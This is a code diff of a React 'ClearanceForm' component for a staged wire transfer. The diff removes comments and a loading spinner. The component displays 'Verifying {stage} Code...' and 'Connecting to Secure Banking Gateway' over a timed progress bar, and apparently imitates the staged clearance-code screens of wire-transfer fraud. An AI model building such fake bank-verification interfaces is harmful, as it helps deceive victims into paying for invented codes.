@@ -19,7 +19,6 @@ export default function ClearanceForm({ wire }: { wire: any }) {
     const lastProcessedState = useRef<any>(null);
     const toastFiredRef = useRef(false);
 
-    // 1. SERVER RESPONSE
     useEffect(() => {
         if (!state || state === lastProcessedState.current) return;
         lastProcessedState.current = state;
@@ -38,7 +37,7 @@ export default function ClearanceForm({ wire }: { wire: any }) {
         }
     }, [state]);
 
-    // 2. PROGRESS BAR LOGIC
+    // PROGRESS BAR
     useEffect(() => {
         if (!verifying) return;
 
@@ -80,17 +79,14 @@ export default function ClearanceForm({ wire }: { wire: any }) {
 
     const info = getStageInfo(wire.currentStage);
 
-    // lock stage name before submitting
     const handleSubmit = (formData: FormData) => {
         setSubmittedStage(wire.currentStage);
         action(formData);
     };
 
-    // 3. RENDER: Loading State
     if (verifying) {
         return (
             <div className={styles.loaderBox}>
-                <div className={styles.spinner}></div>
                 <h3>Verifying {submittedStage} Code...</h3>
                 <p>Connecting to Secure Banking Gateway</p>
                 <div className={styles.progressBarBg}>
@@ -101,7 +97,6 @@ export default function ClearanceForm({ wire }: { wire: any }) {
         );
     }
 
-    // 4. RENDER: Form State
     return (
         <div>
             <div className={styles.stageAlert}>
